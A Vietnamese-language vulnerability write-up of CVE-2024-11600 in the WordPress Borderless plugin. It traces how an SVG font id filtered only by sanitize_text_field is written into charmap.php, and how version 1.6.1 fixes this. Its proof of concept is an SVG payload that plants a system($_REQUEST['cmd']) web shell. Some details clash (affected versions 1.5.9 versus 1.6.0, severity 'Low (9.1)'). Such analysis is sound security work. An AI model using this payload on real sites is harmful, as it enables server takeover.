---
title: CVE-2024-11600 Analysis & POC
description: Security Vulnerability in WordPress Borderless Plugin.
date: 2025-12-06 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, remote code execution]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **The Borderless – Widgets, Elements, Templates and Toolkit for Elementor & Gutenberg** của WordPress tồn tại lỗ hổng **Remote Code Execution** trong tất cả các phiên bản cho đến và bao gồm **1.5.9** thông qua hàm **write_config**. Nguyên nhân là do thiếu **sanitization** trên file **JSON** được import. Điều này cho phép kẻ tấn công đã xác thực, với quyền **Administrator-level access** trở lên, thực thi mã trên server.

* **CVE ID**: [CVE-2024-11600](https://www.cve.org/CVERecord?id=CVE-2024-11600)
* **Vulnerability Type**: Remote Code Execution
* **Affected Versions**: <= 1.6.0
* **Patched Versions**: 1.6.1
* **CVSS severity**: Low (9.1)
* **Required Privilege**: Administrator
* **Product**: [WordPress Borderless Plugin](https://wordpress.org/plugins/borderless/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Borderless**:  
    * `1.6.0` – **vulnerable**  
    * `1.6.1` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause 
**Trong phiên bản lỗi (v1.6.0):**

```php {title="icon-manager.php v1.6.0" data-open=true hl_lines=[15]}
function write_config() {
    $charmap = $this->paths['tempdir'] . '/' . $this->paths['config'];
    $handle  = @fopen( $charmap, 'w' );
    if ( $handle ) {
        fwrite( $handle, '<?php $icons = array();' );
        
        // Safely build the PHP array with sanitized content
        foreach ( $this->json_config[ $this->ip_name ] as $icon => $info ) {
            if ( ! empty( $info ) ) {
                $delimiter   = "'";
                $safe_icon   = esc_attr( $icon );
                $safe_class  = esc_attr( $info["class"] );
                $safe_tags   = esc_attr( $info["tags"] );

                fwrite( $handle, "\r\n" . '$icons[\'' . $this->ip_name . '\'][' . $delimiter . $safe_icon . $delimiter . '] = array("class"=>' . $delimiter . $safe_class . $delimiter . ',"tags"=>' . $delimiter . $safe_tags . $delimiter . ');' );
            } else {
                $this->delete_folder( $this->paths['tempdir'] );
                die( esc_html__( 'Error generating the configuration file.', 'borderless' ) );
            }
        }
        fclose( $handle );
    } else {
        $this->delete_folder( $this->paths['tempdir'] );
        die( esc_html__( 'Error generating the configuration file.', 'borderless' ) );
    }
}
```
Hàm `write_config()` ghi cấu hình icon vào file PHP. Mỗi icon được ghi dưới dạng:

```php
$icons['<ip_name>']['<icon_name>'] = array("class"=>'<class>',"tags"=>'<tags>');
```

Trước khi ghi ra file, biến này được lấy từ thuộc tính `id` của thẻ `<font>` trong SVG và đi qua bộ lọc:

```php {title="icon-manager.php create_config() v1.6.0" data-open=true hl_lines=[15]}
$this->ip_name = (string) $font_attr['id'];
$this->ip_name = sanitize_text_field( $this->ip_name );
```

`sanitize_text_field()` chỉ loại bỏ thẻ HTML, ký tự điều khiển và khoảng trắng thừa. Nó không ngăn chặn các ký tự đặc biệt nguy hiểm trong ngữ cảnh PHP code (ví dụ `'`, `]`, `;`).

Do đó, attacker có thể chèn payload trong thuộc tính `id` của SVG. 

```xml
<font id="']; php_code;//">
```

Khi đó, dòng ghi vào file sẽ trở thành:

```php
$icons['']; php_code;//']['<icon_name>'] = array("class"=>'<class>',"tags"=>'<tags>');
```

**Bản vá (v1.6.1):**

```php {title="index.php v1.6.1" data-open=true hl_lines=[]}
$this->ip_name = sanitize_file_name( $this->ip_name );
if ( empty( $this->ip_name ) ) {
    $this->ip_name = 'unknown';
}
```

Bản vá đã sử dụng `sanitize_file_name()` thay cho `sanitize_text_field()` giúp loại bỏ toàn bộ ký tự đặc biệt nguy hiểm (`'`, `"`, `;`, `|`, `..`, khoảng trắng, Unicode phức tạp…) và chuẩn hóa chuỗi thành tên file/key an toàn. Điều này ngăn chặn việc chèn payload phá vỡ cú pháp PHP trong file cấu hình.

![Diff](diff.png "Sự thay đổi của bản vá")

## Analysis
Plugin đăng ký submenu:

```php {title="dashboard.php v1.6.0" data-open=true hl_lines=[]}
function borderless_icon_fonts_submenu() {
    $icon_manager_page = add_submenu_page(
        'borderless.php',
        esc_html__( "Icon Fonts", "borderless" ),
        esc_html__( "Icon Fonts", "borderless" ),
        'manage_options',
        'borderless-fonts',
        'borderless_custom_icons_menu'
    );
    $Borderless_IF  = new Borderless_IF;
    add_action('admin_print_styles-' . $icon_manager_page, array( $Borderless_IF, 'admin_scripts' ) );
}
```

* `'Icon Fonts'`: Title của submenu
* `'manage_options'`: Menu này chỉ dành cho Administrator
* `'borderless-fonts'`: Menu slug

Tương ứng trên Admin Dashboard:

![Dashboard](dashboard.png "Menu trên Admin Dashboard")

* `'borderless_custom_icons_menu'`: Callback được gọi khi truy cập menu

```php {title="icon-manager.php v1.6.0" data-open=true hl_lines=[]}
function borderless_custom_icons_menu() {
    $Borderless_IF = new Borderless_IF;
    $Borderless_IF->icon_pack_manager();
}
```

Tại đây, đối tượng `Borderless_IF` được tạo:

```php {title="icon-manager.php v1.6.0" data-open=true hl_lines=[]}
class Borderless_IF {
    function __construct() {
        $this->paths            = wp_upload_dir();
        $this->paths['fonts']   = 'borderless_icon_fonts';
        $this->paths['temp']    = trailingslashit( $this->paths['fonts'] ) . 'borderless_temp';
        $this->paths['fontdir'] = trailingslashit( $this->paths['basedir'] ) . $this->paths['fonts'];
        $this->paths['tempdir'] = trailingslashit( $this->paths['basedir'] ) . $this->paths['temp'];
        $this->paths['fonturl'] = set_url_scheme( trailingslashit( $this->paths['baseurl'] ) . $this->paths['fonts'] );
        $this->paths['tempurl'] = trailingslashit( $this->paths['baseurl'] ) . trailingslashit( $this->paths['temp'] );
        $this->paths['config']  = 'charmap.php';

        add_action( 'wp_ajax_borderless_ajax_add_zipped_font', array( $this, 'add_zipped_font' ) );
        add_action( 'wp_ajax_borderless_ajax_remove_zipped_font', array( $this, 'remove_zipped_font' ) );
    }
    ...
}
```

Construct khởi tạo các đường dẫn và hook cần thiết. Hàm `write_config` sử dụng chúng để tạo đường dẫn ghi cấu hình:

```php
$charmap = $this->paths['tempdir'] . '/' . $this->paths['config'];

// <base_url>/wp-content/uploads/borderless_icon_fonts/borderless_temp/charmap.php
```

AJAX action `wp_ajax_borderless_ajax_add_zipped_font` được đăng ký để xử lý việc upload và thêm font từ file zip, với callback `add_zipped_font` được gọi để thực hiện quá trình giải nén và ghi dữ liệu vào file cấu hình.

```php {title="icon-manager.php v1.6.0" data-open=true hl_lines=[9,13]}
function add_zipped_font() {
    $cap = apply_filters( 'avf_file_upload_capability', 'update_plugins' );
    if ( ! current_user_can( $cap ) ) {
        die( esc_html__( "You do not have sufficient permissions to use this feature.", "borderless" ) );
    }
    // Retrieve the file path of the zip file
    $attachment = $_POST['values'];
    $path       = realpath( get_attached_file( sanitize_text_field( $attachment['id'] ) ) );
    $unzipped   = $this->zip_flatten( $path, array( '\.eot', '\.svg', '\.ttf', '\.woff', '\.json', '\.css' ) );
    
    // If we managed to unzip the file and save it, extract the SVG file
    if ( $unzipped ) {
        $this->create_config();
    }
    
    // If we did not get a name for the font, do not add it and remove the temp folder
    if ( $this->ip_name == 'unknown' ) {
        $this->delete_folder( $this->paths['tempdir'] );
        die( esc_html__( 'Unable to retrieve the Icon Pack name from your uploaded folder.', 'borderless' ) );
    }
    die( esc_html__( 'borderless_font_added:', 'borderless' ) . $this->ip_name );
}
```

Trong hàm `add_zipped_font()`, sau khi người dùng upload một file zip chứa Icon Pack, plugin thực hiện các bước:
1. Kiểm tra quyền `update_plugins` => chỉ dành cho Administrator.
2. Unzip và chỉ giữ lại các file cần thiết cho Icon Pack: font (`.eot`, `.svg`, `.ttf`, `.woff`), `JSON`, `CSS`.
3. Gọi đến `create_config()` để tạo config file:

```php {title="icon-manager.php v1.6.0" data-open=false hl_lines=[64]}
function create_config() {
    $this->json_file = $this->find_json();
    $this->svg_file  = $this->find_svg();
    if ( empty( $this->json_file ) || empty( $this->svg_file ) ) {
        $this->delete_folder( $this->paths['tempdir'] );
        die( esc_html__( 'SVG file or selection.json not found. Please check the integrity of the Icon Pack files.', 'borderless' ) );
    }

    // Attempt to read the SVG file
    $response = wp_remote_fopen( trailingslashit( $this->paths['tempurl'] ) . $this->svg_file );
    $json     = file_get_contents( trailingslashit( $this->paths['tempdir'] ) . $this->json_file );

    if ( empty( $response ) ) {
        $response = file_get_contents( trailingslashit( $this->paths['tempdir'] ) . $this->svg_file );
    }

    if ( ! is_wp_error( $json ) && ! empty( $json ) ) {
        // Load and parse the SVG
        $xml       = simplexml_load_string( $response );
        $font_attr = $xml->defs->font->attributes();
        $glyphs    = $xml->defs->font->children();

        // Sanitize the font name (ip_name)
        $this->ip_name = (string) $font_attr['id'];
        $this->ip_name = sanitize_text_field( $this->ip_name );

        $font_folder = trailingslashit( $this->paths['fontdir'] ) . $this->ip_name;
        if ( is_dir( $font_folder ) ) {
            $this->delete_folder( $this->paths['tempdir'] );
            die( esc_html__( "There is already an Icon Pack with this name. Please upload with another name.", "borderless" ) );
        }

        // Decode JSON content
        $file_contents = json_decode( $json );
        if ( ! isset( $file_contents->IcoMoonType ) ) {
            $this->delete_folder( $this->paths['tempdir'] );
            die( esc_html__( "This Icon Pack is not an Icomoon pack. Use only Icomoon Icon Pack files.", 'borderless' ) );
        }
        
        // Iterate over icons to build $this->json_config
        $icons = $file_contents->icons;
        foreach ( $icons as $icon ) {
            // Sanitize each piece of data to prevent injection
            $raw_name   = isset( $icon->properties->name ) ? $icon->properties->name : 'unknown';
            $icon_name  = sanitize_text_field( $raw_name );
            
            // Create a "class" by removing spaces and sanitizing further
            $icon_class = str_replace( ' ', '', $icon_name );
            // Remove any other characters that are not typical in a CSS class
            $icon_class = preg_replace( '/[^A-Za-z0-9\-_]/', '', $icon_class );
            
            $raw_tags   = isset( $icon->icon->tags ) ? $icon->icon->tags : array();
            // Sanitize each tag
            $safe_tags  = array_map( 'sanitize_text_field', $raw_tags );
            $tags       = implode( ",", $safe_tags );
            
            $this->json_config[ $this->ip_name ][ $icon_name ] = array(
                "class" => $icon_class,
                "tags"  => $tags
            );
        }

        if ( ! empty( $this->json_config ) && $this->ip_name != 'unknown' ) {
            $this->write_config();
            $this->re_write_css();
            $this->rename_files();
            $this->rename_folder();
            $this->add_font();
        }
    }

    return false;
}
```

Hàm này là **trái tim** của quá trình thêm Icon Pack. Nó chịu trách nhiệm đọc dữ liệu từ file SVG và JSON, sau đó sinh ra cấu hình icon để plugin sử dụng.  

1. Kiểm tra file cần thiết
```php
$this->json_file = $this->find_json();
$this->svg_file  = $this->find_svg();
if ( empty( $this->json_file ) || empty( $this->svg_file ) ) {
    $this->delete_folder( $this->paths['tempdir'] );
    die( esc_html__( 'SVG file or selection.json not found...', 'borderless' ) );
}
```
- Plugin tìm file `.json` và file font `.svg` trong thư mục tạm.  
- Nếu thiếu một trong hai, quá trình bị hủy.

2. Đọc nội dung SVG và JSON

```php
$response = wp_remote_fopen( trailingslashit( $this->paths['tempurl'] ) . $this->svg_file );
$json     = file_get_contents( trailingslashit( $this->paths['tempdir'] ) . $this->json_file );
```
- Dùng `wp_remote_fopen` để đọc SVG qua URL, fallback sang `file_get_contents` nếu thất bại.  
- Đọc JSON trực tiếp từ thư mục tạm.

3. Parse SVG để lấy tên font
```php
$xml       = simplexml_load_string( $response );
$font_attr = $xml->defs->font->attributes();
$this->ip_name = (string) $font_attr['id'];
$this->ip_name = sanitize_text_field( $this->ip_name );
```
- Lấy thuộc tính `id` của `<font>` làm tên font (`ip_name`).  
- Chỉ lọc bằng `sanitize_text_field` → đây chính là điểm yếu, vì hàm này không loại bỏ ký tự nguy hiểm trong ngữ cảnh file PHP.  

4. Kiểm tra trùng tên
```php
$font_folder = trailingslashit( $this->paths['fontdir'] ) . $this->ip_name;
if ( is_dir( $font_folder ) ) {
    $this->delete_folder( $this->paths['tempdir'] );
    die( esc_html__( "There is already an Icon Pack with this name...", "borderless" ) );
}
```
- Nếu thư mục font với tên đó đã tồn tại, quá trình bị hủy.

5. Parse JSON để lấy danh sách icon
```php
$file_contents = json_decode( $json );
if ( ! isset( $file_contents->IcoMoonType ) ) {
    $this->delete_folder( $this->paths['tempdir'] );
    die( esc_html__( "This Icon Pack is not an Icomoon pack...", 'borderless' ) );
}
```
- Đảm bảo JSON là pack IcoMoon hợp lệ.  
- Lặp qua danh sách icon, sanitize tên, class, tags rồi đưa vào `$this->json_config`.

6. Sinh cấu hình và ghi file
```php
if ( ! empty( $this->json_config ) && $this->ip_name != 'unknown' ) {
    $this->write_config();
    $this->re_write_css();
    $this->rename_files();
    $this->rename_folder();
    $this->add_font();
}
```

- Nếu dữ liệu hợp lệ, plugin sẽ:
  - Ghi file `charmap.php` chứa mảng `$icons`.
  - Sinh lại CSS.
  - Đổi tên file và thư mục.
  - Thêm font pack vào hệ thống.

File JSON và SVG yêu cầu sẽ có dạng:

```JSON {data-open=true}
{
  "IcoMoonType": "selection",
  "icons": [
    {
      "properties": {
        "name": "home"
      },
      "icon": {
        "tags": ["house", "main"]
      }
    }
  ]
}
```

```xml {data-open=true}
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg">
  <defs>
    <font id="id" horiz-adv-x="1024">
      <font-face font-family="icomoon" units-per-em="1024" ascent="960" descent="-64"/>
      <glyph unicode="&#xe900;" glyph-name="home" d="M512 128L128 512h128v320h192V640h128v192h192V512h128z"/>
    </font>
  </defs>
</svg>
```

## Flow
{{< mermaid >}}
graph TD
A["Attacker with Administrator privilege"]
--> B["Uploads a ZIP file containing an Icon Pack (SVG + JSON)"]

B --> C["AJAX call: borderless_ajax_add_zipped_font"]
C --> D["zip_flatten() extracts files into /uploads/borderless_icon_fonts/borderless_temp/"]

D --> E["create_config() is executed"]

E --> F["Reads the SVG file"]
F --> G["Extracts font id=... as ip_name"]
G --> H["sanitize_text_field(ip_name) (dangerous characters not removed)"]

E --> I["Reads JSON file"]
I --> J["Builds $this->json_config array"]

H & J --> K["write_config() writes data into charmap.php"]

K --> L["Injected payload is embedded into PHP code"]
L --> M["charmap.php now contains malicious PHP"]

M --> N["Server loads/includes charmap.php"]
N --> O["Remote Code Execution (RCE)"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo ZIP file chứa `rce.json` và `rce.svg`:
```JSON {data-open=true title="rce.json"}
{
  "IcoMoonType": "selection",
  "icons": [
    {
      "properties": {
        "name": "home"
      },
      "icon": {
        "tags": ["house", "main"]
      }
    }
  ]
}
```

```xml {data-open=true title="rce.svg"}
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg">
  <defs>
    <font id="'];system($_REQUEST['cmd']);//" horiz-adv-x="1024">
      <font-face font-family="icomoon" units-per-em="1024" ascent="960" descent="-64"/>
      <glyph unicode="&#xe900;" glyph-name="home" d="M512 128L128 512h128v320h192V640h128v192h192V512h128z"/>
    </font>
  </defs>
</svg>
```

2. Dùng Administrator account upload ZIP file lên tại endpoint:

```
http://localhost/wp-admin/admin.php?page=borderless-fonts
```

![Uploaded](upload.png "File được upload")

3. **RCE**:

![Result](result.png "Kết quả")

## Conclusion
CVE-2024-11600 cho thấy việc dùng sai hàm lọc dữ liệu có thể dẫn tới **Remote Code Execution**. Plugin Borderless (≤ 1.6.0) lấy trực tiếp giá trị `<font id>` từ SVG, chỉ lọc bằng `sanitize_text_field()`, rồi ghi vào file PHP (`charmap.php`). Kẻ tấn công có quyền Admin có thể chèn mã PHP vào đó và được thực thi khi file được load. Bản 1.6.1 đã khắc phục bằng cách dùng `sanitize_file_name()` và giá trị fallback.

## Key Takeaways
* Luôn **lọc theo đúng ngữ cảnh** (đang ghi vào PHP, không phải text thường).
* Không dùng `sanitize_text_field()` cho dữ liệu ghi vào mã nguồn thực thi.
* SVG/ZIP cũng có thể là vector tấn công.
* Việc tự động tạo file `.php` luôn cần kiểm soát chặt chẽ.

## References

[Remote Code Execution (RCE)](https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/)

[WordPress Borderless Plugin <= 1.6.0 is vulnerable to Remote Code Execution (RCE)](https://vdp.patchstack.com/database/wordpress/plugin/borderless/vulnerability/wordpress-borderless-plugin-1-5-9-authenticated-administrator-remote-code-execution-vulnerability)